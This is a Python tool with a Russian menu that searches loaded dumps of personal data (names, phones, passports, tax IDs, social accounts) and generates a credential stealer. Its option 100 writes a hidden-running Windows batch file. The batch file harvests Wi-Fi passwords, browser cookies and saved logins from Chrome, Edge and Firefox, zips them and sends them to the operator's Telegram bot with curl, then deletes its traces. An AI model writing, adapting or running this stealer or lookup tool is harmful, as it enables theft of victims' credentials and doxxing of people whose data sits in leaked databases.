#!/usr/bin/env python3
# FPYTHONSOCIAL v13.0 – OSINT + Stealer Generator (no questions, uses config)

import os, sys, time, random, shutil, re, json
from datetime import datetime

AUTHOR = "@PythonSocial"
PURPLE = "\033[38;2;180;0;255m"
PURPLE_BOLD = "\033[38;2;220;50;255m"
PURPLE_DIM = "\033[38;2;100;0;150m"
RED = "\033[38;2;255;0;0m"
RESET = "\033[0m"
CLEAR = "\033[2J\033[H"
HOME = "\033[H"

LOGO = r"""
███████╗██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗██╗ █████╗ ██╗     
██╔════╝██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║██╔════╝██╔════╝██╔════╝██║██╔══██╗██║     
█████╗  ██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║███████╗██║     ██║     ██║███████║██║     
██╔══╝  ██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║╚════██║██║     ██║     ██║██╔══██║██║     
██║     ██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║███████║╚██████╗╚██████╗██║██║  ██║███████╗
╚═╝     ╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝
"""

def fullscreen():
    try:
        if os.name == 'nt':
            import ctypes
            ctypes.windll.user32.keybd_event(0x7A, 0, 0, 0)
        else:
            sys.stdout.write("\033[3;0t")
    except:
        pass

rain_running = True
def red_rain_fullscreen():
    global rain_running
    try:
        rows, cols = shutil.get_terminal_size()
    except:
        rows, cols = 30, 80
    drops = [[0] * cols for _ in range(rows)]
    chars = "0123456789"
    start_time = time.time()
    while rain_running and time.time() - start_time < 5:
        sys.stdout.write(HOME)
        for y in range(rows):
            line = ""
            for x in range(cols):
                if drops[y][x] == 0:
                    drops[y][x] = random.randint(1, 25)
                if random.random() < 0.03:
                    drops[y][x] = 0
                if drops[y][x] > 0:
                    drops[y][x] -= 1
                    char = random.choice(chars)
                    brightness = random.randint(180, 255)
                    line += f"\033[38;2;{brightness};0;0m{char}\033[0m"
                else:
                    line += " "
            print(line)
        sys.stdout.flush()
        time.sleep(0.04)

def startup_rain():
    fullscreen()
    sys.stdout.write(CLEAR)
    red_rain_fullscreen()
    sys.stdout.write(CLEAR)

class DB:
    def __init__(self):
        self.data = []
        self.files = []
    def load(self, fp):
        try:
            if fp.endswith('.json'):
                import json
                with open(fp, 'r', encoding='utf-8') as f:
                    self.data.extend(json.load(f))
            elif fp.endswith('.csv'):
                import csv
                with open(fp, 'r', encoding='utf-8') as f:
                    for row in csv.reader(f):
                        self.data.append(" ".join(row))
            else:
                with open(fp, 'r', encoding='utf-8') as f:
                    self.data.extend([line.strip() for line in f if line.strip()])
            self.files.append(fp)
            return True
        except Exception as e:
            print(f"Ошибка: {e}")
            return False
    def search(self, q, st='all'):
        res = []
        q = q.lower().strip()
        if not q:
            return res
        for e in self.data:
            el = e.lower()
            if st == 'phone':
                clean = re.sub(r'[^0-9+]', '', e)
                if q in clean.lower():
                    res.append(e)
            elif st == 'email':
                if q in el and '@' in e:
                    res.append(e)
            elif st == 'name':
                if all(p in el for p in q.split()):
                    res.append(e)
            else:
                if q in el:
                    res.append(e)
        return res

db = DB()

CONFIG_FILE = os.path.expanduser("~/.fpythonsocial_config.json")
config = {}
if os.path.exists(CONFIG_FILE):
    try:
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
    except:
        config = {}

def save_config():
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def ensure_config():
    if 'bot_token' not in config or 'chat_id' not in config:
        print(f"{PURPLE_BOLD}Для работы стилера (100) необходимо настроить бота.{RESET}")
        token = input(f"{PURPLE}Введите токен бота Telegram: {RESET}").strip()
        cid = input(f"{PURPLE}Введите Chat ID: {RESET}").strip()
        if token and cid:
            config['bot_token'] = token
            config['chat_id'] = cid
            save_config()
            print(f"{PURPLE_DIM}Настройки сохранены.{RESET}")
            time.sleep(1)
        else:
            print(f"{RED}Ошибка: токен и Chat ID обязательны.{RESET}")
            time.sleep(1)
            return False
    return True

def create_stealer():
    if not ensure_config():
        return
    token = config['bot_token']
    cid = config['chat_id']
    save_path = os.path.expanduser("~/stealer.bat")
    bat_content = f"""@echo off
if not "%1"=="-hidden" (
    start /b "" powershell -WindowStyle Hidden -Command "Start-Process -WindowStyle Hidden -FilePath '%~f0' -ArgumentList '-hidden'"
    exit /b
)

set BOT_TOKEN={token}
set CHAT_ID={cid}

set TMP_DIR=%TEMP%\\stolen_%RANDOM%
mkdir %TMP_DIR%

systeminfo > %TMP_DIR%\\sysinfo.txt
ipconfig /all >> %TMP_DIR%\\ipconfig.txt
whoami >> %TMP_DIR%\\user.txt

netsh wlan show profiles > %TMP_DIR%\\wifi.txt
for /f "tokens=2 delims=:" %%i in ('netsh wlan show profiles ^| find "Имя"') do (
    netsh wlan show profile name="%%i" key=clear >> %TMP_DIR%\\wifi_passwords.txt
)

set CHROME_PATH=%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies
if exist "%CHROME_PATH%" copy "%CHROME_PATH%" %TMP_DIR%\\cookies_chrome

set EDGE_PATH=%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Cookies
if exist "%EDGE_PATH%" copy "%EDGE_PATH%" %TMP_DIR%\\cookies_edge

set LOGIN_DATA=%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data
if exist "%LOGIN_DATA%" copy "%LOGIN_DATA%" %TMP_DIR%\\login_data_chrome

set EDGE_LOGIN=%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data
if exist "%EDGE_LOGIN%" copy "%EDGE_LOGIN%" %TMP_DIR%\\login_data_edge

set FF_PATH=%APPDATA%\\Mozilla\\Firefox\\Profiles\\
if exist "%FF_PATH%" (
    for /d %%d in ("%FF_PATH%\\*.default*") do (
        if exist "%%d\\cookies.sqlite" copy "%%d\\cookies.sqlite" %TMP_DIR%\\cookies_firefox
        if exist "%%d\\logins.json" copy "%%d\\logins.json" %TMP_DIR%\\logins_firefox
    )
)

powershell -command "(Invoke-WebRequest -Uri 'http://ifconfig.me/ip').Content.Trim()" > %TMP_DIR%\\ip.txt

powershell -command "Compress-Archive -Path %TMP_DIR%\\* -DestinationPath %TMP_DIR%\\data.zip -Force"

curl -F "chat_id=%CHAT_ID%" -F "document=@%TMP_DIR%\\data.zip" https://api.telegram.org/bot%BOT_TOKEN%/sendDocument

rd /s /q %TMP_DIR%
exit
"""
    try:
        with open(save_path, 'w', encoding='utf-8') as f:
            f.write(bat_content)
        print(f"{PURPLE_BOLD}[+] BAT-файл создан: {save_path}{RESET}")
    except Exception as e:
        print(f"{RED}Ошибка: {e}{RESET}")
    time.sleep(2)

def print_header():
    sys.stdout.write(CLEAR)
    print(f"{PURPLE}{LOGO}{RESET}")
    print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
    print(f"{PURPLE_BOLD}   FPYTHONSOCIAL v13.0     {PURPLE_DIM}by {AUTHOR}{RESET}")
    print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
    print(f"{PURPLE_DIM}   Записей: {len(db.data)} | Файлов: {len(db.files)}{RESET}")
    print(f"{PURPLE_BOLD}{'═'*60}{RESET}")

def menu_loop():
    global db
    while True:
        print_header()
        items = [
            "1.ФИО", "2.Телефон", "3.Email", "4.Адрес", "5.Паспорт",
            "6.IP", "7.Логин", "8.Дата", "9.Авто", "10.СНИЛС",
            "11.ИНН", "12.ОКВЭД", "13.Компания", "14.Должность", "15.Telegram",
            "16.VK", "17.Instagram", "18.Twitter", "19.Домен", "20.Общий"
        ]
        for i in range(0, len(items), 4):
            row = items[i:i+4]
            line = ""
            for item in row:
                line += f"{PURPLE_BOLD}{item:<14}{RESET} "
            print(line)
        print()
        print(f"{PURPLE_DIM}  21-Загрузить  22-Файлы  23-Очистить  100-Стилер  0-Выход{RESET}")
        print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
        choice = input(f"{PURPLE}┌─ Введите номер команды или запрос:{RESET}\n{PURPLE}└─> {RESET}").strip()
        if choice == '0':
            break
        elif choice == '21':
            fp = input("Путь к файлу: ").strip()
            if db.load(fp):
                print(f"Загружено. Всего: {len(db.data)}")
            time.sleep(1)
            continue
        elif choice == '22':
            print("Файлы:")
            for f in db.files:
                print(f"  {f}")
            print(f"Всего записей: {len(db.data)}")
            time.sleep(1)
            continue
        elif choice == '23':
            db.data = []
            db.files = []
            print("База очищена.")
            time.sleep(1)
            continue
        elif choice == '100':
            create_stealer()
            continue
        if not db.data:
            print("База пуста! Загрузите файл (21).")
            time.sleep(1)
            continue
        types_map = {
            '1':'name','2':'phone','3':'email','4':'address','5':'passport',
            '6':'all','7':'all','8':'all','9':'all','10':'all',
            '11':'all','12':'all','13':'all','14':'all','15':'all',
            '16':'all','17':'all','18':'all','19':'all','20':'all'
        }
        st = types_map.get(choice, 'all')
        query = input(f"{PURPLE}┌─ Введите запрос:{RESET}\n{PURPLE}└─> {RESET}").strip()
        if not query:
            continue
        results = db.search(query, st)
        print(f"\n{PURPLE_BOLD}=== Результаты по '{query}' ({len(results)} записей) ==={RESET}")
        if not results:
            print(f"{PURPLE_DIM}Ничего не найдено.{RESET}")
        else:
            for i, r in enumerate(results[:30], 1):
                print(f"{PURPLE}[{i:2}]{RESET} {r}")
            if len(results) > 30:
                print(f"{PURPLE_DIM}... и ещё {len(results)-30} записей.{RESET}")
        print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
        input(f"{PURPLE_DIM}Нажмите Enter для продолжения...{RESET}")

if __name__ == '__main__':
    startup_rain()
    menu_loop()
